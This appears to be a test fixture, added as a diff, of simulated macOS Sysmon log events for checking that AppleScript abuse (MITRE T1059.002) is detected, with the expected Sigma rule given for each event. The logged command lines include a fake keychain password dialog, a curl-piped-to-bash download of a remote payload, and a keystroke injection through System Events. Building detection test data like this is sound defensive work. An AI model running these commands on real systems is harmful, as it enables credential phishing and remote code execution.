@@ -1,0 +1,203 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.002",
+    "variation": "001",
+    "name": "AppleScript - osascript Execution",
+    "description": "Adversary uses osascript to execute AppleScript commands for malicious purposes",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "macOS Sysmon Event 1 - osascript credential phishing",
+      "sequence": 1,
+      "timestamp": "2026-02-08T14:30:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T14:30:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for macOS - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.002"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: AppleScript"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "macos"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.100"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300010",
+        "decoder": {
+          "name": "sysmon-macos"
+        },
+        "location": "/var/log/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 14:30:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0002-000000000001}",
+            "processId": "45123",
+            "image": "/usr/bin/osascript",
+            "commandLine": "osascript -e 'display dialog \"System Preferences wants to access your keychain\" default answer \"\" with hidden answer with title \"Keychain Access\" buttons {\"Cancel\", \"OK\"} default button \"OK\"'",
+            "currentDirectory": "/Users/victim",
+            "user": "victim",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0002-PARENT000001}",
+            "parentProcessId": "45100",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.002",
+        "_fomorian_expected_detection": "Sigma: Osascript Credential Dialog (T1059.002)"
+      }
+    },
+    {
+      "_comment": "macOS Sysmon Event 1 - osascript download and execute",
+      "sequence": 2,
+      "timestamp": "2026-02-08T14:31:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T14:31:00.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon for macOS - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.002"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: AppleScript"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "macos"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.100"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300011",
+        "decoder": {
+          "name": "sysmon-macos"
+        },
+        "location": "/var/log/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 14:31:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0002-000000000002}",
+            "processId": "45189",
+            "image": "/usr/bin/osascript",
+            "commandLine": "osascript -e 'do shell script \"curl -s http://198.51.100.110/payload.sh | bash\"'",
+            "currentDirectory": "/Users/victim",
+            "user": "victim",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0002-PARENT000002}",
+            "parentProcessId": "45100",
+            "parentImage": "/Applications/Safari.app/Contents/MacOS/Safari",
+            "parentCommandLine": "/Applications/Safari.app/Contents/MacOS/Safari"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.002",
+        "_fomorian_expected_detection": "Sigma: Osascript Shell Script Execution (T1059.002)"
+      }
+    },
+    {
+      "_comment": "macOS Sysmon Event 1 - osascript system events",
+      "sequence": 3,
+      "timestamp": "2026-02-08T14:32:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T14:32:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon for macOS - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.002"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Command and Scripting Interpreter: AppleScript"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "macos"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.100"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300012",
+        "decoder": {
+          "name": "sysmon-macos"
+        },
+        "location": "/var/log/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 14:32:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1059-0002-000000000003}",
+            "processId": "45234",
+            "image": "/usr/bin/osascript",
+            "commandLine": "osascript -e 'tell application \"System Events\" to keystroke \"s\" using command down'",
+            "currentDirectory": "/Users/victim",
+            "user": "victim",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1059-0002-PARENT000003}",
+            "parentProcessId": "45100",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.002",
+        "_fomorian_expected_detection": "Sigma: Osascript System Events Access (T1059.002)"
+      }
+    }
+  ]
+}
